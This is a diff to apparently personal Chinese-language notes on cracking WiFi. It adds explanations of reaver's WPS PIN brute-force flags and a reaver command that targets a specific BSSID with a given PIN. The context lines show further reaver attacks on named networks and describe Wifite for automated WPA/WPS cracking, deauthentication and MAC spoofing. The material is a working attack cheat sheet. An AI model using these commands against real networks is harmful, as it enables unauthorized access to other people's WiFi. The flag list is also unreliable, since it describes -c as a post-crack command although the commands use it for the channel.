@@ -161,6 +161,27 @@ sudo reaver -i wlan0mon -b A8:57 -a -c 11 -e CMCC-XX -l 60 -S -vv
 sudo reaver -i wlan0mon -b E4:47 -c 8 -vv -S     -A  -F  -l 60
 
 
+    -i，开启了监听模式的网络接口名
+    -b，要探测的Wifi的BSSID
+    -c，成功破解之后运行的命令
+    -5，使用5G信道
+    -v，显示具体信息，-vv或者-vvv可以显示更加详细的信息
+    -q，仅显示关键信息
+    -p，要使用的PIN
+    -d，尝试PIN之间的间隔时间（默认1）
+    -l，如果路由器锁定尝试PIN，等待的时间（默认60）
+    -g，最大尝试次数，到达次数之后命令会停止
+    -x，10次意外失败之后的等待时间（默认0）
+    -t，接收超时周期（默认10）
+    -F，忽略帧校验错误
+
+sudo reaver -i wlan0mon -b BC:D1 -p 81103355 -vv
+
+
+
+
+
+
 Wifite是一款能够攻击多种无线加密方式（WEP/WPA/WPA2和WPS）的自动化工具， Wifite在运行之前需要提供几个参数，而Wifite将会自动帮我们完成所有的任务。
 它可以捕获WPA握手包，自动化去客户端验证，进行MAC地址欺骗，以及破解WiFi密码。
 
